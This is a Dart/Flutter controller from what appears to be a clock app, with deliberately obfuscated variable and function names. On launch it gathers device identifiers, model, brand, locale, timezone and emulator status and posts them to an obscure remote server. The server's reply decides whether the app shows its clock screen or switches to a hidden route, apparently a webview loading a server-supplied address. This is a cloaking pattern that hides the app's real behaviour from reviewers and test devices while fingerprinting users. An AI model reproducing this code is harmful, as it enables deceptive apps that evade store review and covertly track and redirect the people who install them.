import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void gmklhla() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/reload");
  }
}

class PageLogic extends GetxController {

  var mydsqle = RxBool(false);
  var tzsfmubqj = RxBool(true);
  var mhqop = RxString("");
  var arjun = RxBool(false);
  var carter = RxBool(true);
  final nifasqpvb = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    gmklhla();
    sipmlk();
  }


  Future<void> sipmlk() async {

    arjun.value = true;
    carter.value = true;
    tzsfmubqj.value = false;

    nifasqpvb.post("https://zon.tickingme.pro/mhclgdanetbuvrysxikqwzjpfo",data: await obedcg()).then((value) {
      var zbfaqtwy = value.data["zbfaqtwy"] as String;
      var vwng = value.data["vwng"] as bool;
      if (vwng) {
        SystemChrome.setPreferredOrientations([DeviceOrientation.portraitUp]);
        mhqop.value = zbfaqtwy;
        marshall();
      } else {
        leffler();
      }
    }).catchError((e) {
      tzsfmubqj.value = true;
      carter.value = true;
      arjun.value = false;
    });
  }

  Future<Map<String, dynamic>> obedcg() async {
    final DeviceInfoPlugin dxhlij = DeviceInfoPlugin();
    PackageInfo iyetb_gxtvlwuf = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var uocr = Platform.localeName;
    var rdamy_nTm = currentTimeZone;

    var rdamy_raIF = iyetb_gxtvlwuf.packageName;
    var rdamy_po = iyetb_gxtvlwuf.version;
    var rdamy_GM = iyetb_gxtvlwuf.buildNumber;

    var rdamy_Ant = iyetb_gxtvlwuf.appName;
    var rdamy_lA = "";
    var rdamy_gPfer  = "";
    var rdamy_oqdENIw = "";
    var nicklausBartoletti = "";
    var blancheNienow = "";
    var clevelandLowe = "";
    var adrielReichel = "";
    var enidRowe = "";
    var hazleGaylord = "";
    var vivienneWillms = "";


    var rdamy_OmRGi = "";
    var rdamy_hf = false;

    if (GetPlatform.isAndroid) {
      rdamy_OmRGi = "android";
      var ctwplivn = await dxhlij.androidInfo;

      rdamy_oqdENIw = ctwplivn.brand;

      rdamy_lA  = ctwplivn.model;
      rdamy_gPfer = ctwplivn.id;

      rdamy_hf = ctwplivn.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      rdamy_OmRGi = "ios";
      var uvjdxzfli = await dxhlij.iosInfo;
      rdamy_oqdENIw = uvjdxzfli.name;
      rdamy_lA = uvjdxzfli.model;

      rdamy_gPfer = uvjdxzfli.identifierForVendor ?? "";
      rdamy_hf  = uvjdxzfli.isPhysicalDevice;
    }
    var res = {
      "rdamy_GM": rdamy_GM,
      "rdamy_po": rdamy_po,
      "rdamy_raIF": rdamy_raIF,
      "rdamy_lA": rdamy_lA,
      "rdamy_oqdENIw": rdamy_oqdENIw,
      "rdamy_Ant": rdamy_Ant,
      "rdamy_gPfer": rdamy_gPfer,
      "uocr": uocr,
      "clevelandLowe" : clevelandLowe,
      "adrielReichel" : adrielReichel,
      "rdamy_OmRGi": rdamy_OmRGi,
      "rdamy_hf": rdamy_hf,
      "nicklausBartoletti" : nicklausBartoletti,
      "blancheNienow" : blancheNienow,
      "rdamy_nTm": rdamy_nTm,
      "enidRowe" : enidRowe,
      "hazleGaylord" : hazleGaylord,
      "vivienneWillms" : vivienneWillms,

    };
    return res;
  }

  Future<void> leffler() async {
    Get.offAllNamed("/clockMain");
  }

  Future<void> marshall() async {
    Get.offAllNamed("/clock_up");
  }

}
